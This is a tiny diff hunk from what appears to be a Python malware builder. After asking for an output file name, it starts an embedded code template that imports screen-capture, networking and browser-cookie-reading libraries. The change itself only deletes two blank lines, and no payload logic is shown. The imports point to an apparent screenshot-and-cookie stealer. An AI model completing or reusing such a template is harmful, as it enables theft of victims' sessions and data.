@@ -204,8 +204,6 @@ else:
     exit()
 name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
 code = """
-
-
 import os,requests,socket,threading
 from PIL import ImageGrab
 import browser_cookie3
